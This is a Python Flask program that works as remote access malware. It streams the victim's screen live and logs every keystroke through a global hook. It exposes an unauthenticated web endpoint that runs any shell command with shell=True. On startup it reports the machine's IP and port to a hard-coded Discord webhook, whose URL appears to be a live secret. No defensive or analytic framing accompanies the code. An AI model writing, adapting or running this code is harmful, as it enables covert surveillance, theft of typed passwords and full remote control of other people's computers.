import cv2
import numpy as np
from flask import Flask, Response, render_template_string, jsonify, request
import mss
from PIL import Image
import keyboard
import threading
import webbrowser
import requests
import subprocess

app = Flask(__name__)


keyboard_inputs = []


DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1285311396325888154/14tNTlZaOtICPsZmNEpJNJfNg6z24t2QLMluJaf90dQgO_eJisDZzLM8Zdn28YVAzC0b'



def send_to_discord(ip, port):
    content = f"Flask app is running on http://{ip}:{port}"
    payload = {
        'content': content,
        'username': 'Flask App Notification'
    }
    try:
        response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
        if response.status_code == 204:
            print('Successfully sent message to Discord webhook.')
        else:
            print(f'Failed to send message. Status code: {response.status_code}')
    except Exception as e:
        print(f'Error sending message to Discord webhook: {e}')


def capture_screen():
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        while True:
            sct_img = sct.grab(monitor)
            img = Image.frombytes('RGB', (sct_img.width, sct_img.height), sct_img.rgb)
            img = np.array(img)
            img = cv2.cvtColor(img, cv2.COLOR_RGB2BGR)
            _, buffer = cv2.imencode('.jpg', img)
            frame = buffer.tobytes()

            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')


def listen_keyboard():
    global keyboard_inputs
    current_input = []
    while True:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN:
            if event.name == 'enter':
                keyboard_inputs.append(''.join(current_input))
                current_input = []
            elif event.name == 'backspace':
                if current_input:
                    current_input.pop()
            else:
                current_input.append(event.name)


@app.route('/video_feed')
def video_feed():
    return Response(capture_screen(),
                    mimetype='multipart/x-mixed-replace; boundary=frame')


@app.route('/')
def index():
    return render_template_string('''
        <h1>Live Screen and Keyboard Inputs</h1>
        <h2>Screen Feed:</h2>
        <img src="{{ url_for('video_feed') }}" width="700px">
        
        <h2>Keyboard Inputs:</h2>
        <div id="keyboard_inputs" style="white-space: pre-wrap; font-family: monospace;"></div>

        <h2>Send Command to CMD:</h2>
        <form id="cmd_form">
            <input type="text" id="cmd_input" name="command" placeholder="Enter command" style="width: 500px;" oninput="updateCmdInput()">
            <button type="button" onclick="sendCommand()">Send</button>
        </form>
        <h3>Command Output:</h3>
        <pre id="cmd_output" style="white-space: pre-wrap; font-family: monospace;"></pre>

        <script>
            function updateKeyboardInputs() {
                fetch('/keyboard_inputs')
                    .then(response => response.json())
                    .then(data => {
                        const container = document.getElementById('keyboard_inputs');
                        container.innerHTML = '';  // Clear existing inputs
                        data.inputs.forEach(input => {
                            const div = document.createElement('div');
                            div.textContent = input;
                            container.appendChild(div);
                        });
                    });
            }
            setInterval(updateKeyboardInputs, 500);  // Update every 0.5 seconds

            function updateCmdInput() {
                const command = document.getElementById('cmd_input').value;
                document.getElementById('cmd_output').textContent = '';  // Clear previous output
                fetch('/execute_command', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ command: command })
                })
                .then(response => response.json())
                .then(data => {
                    document.getElementById('cmd_output').textContent = data.output;
                });
            }

            function sendCommand() {
                const command = document.getElementById('cmd_input').value;
                fetch('/execute_command', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ command: command })
                })
                .then(response => response.json())
                .then(data => {
                    document.getElementById('cmd_output').textContent = data.output;
                });
            }
        </script>
    ''')


@app.route('/keyboard_inputs')
def keyboard_inputs_route():
    return jsonify({'inputs': keyboard_inputs})


@app.route('/execute_command', methods=['POST'])
def execute_command():
    data = request.json
    command = data.get('command', '')
    try:
        result = subprocess.run(command, capture_output=True, text=True, shell=True)
        output = result.stdout + result.stderr
    except Exception as e:
        output = f'Error executing command: {e}'
    return jsonify({'output': output})

if __name__ == '__main__':

    import socket
    ip_address = socket.gethostbyname(socket.gethostname())
    port = 1029  

    
    send_to_discord(ip_address, port)

   
    threading.Thread(target=listen_keyboard, daemon=True).start()

    
    app.run(host='0.0.0.0', port=port)
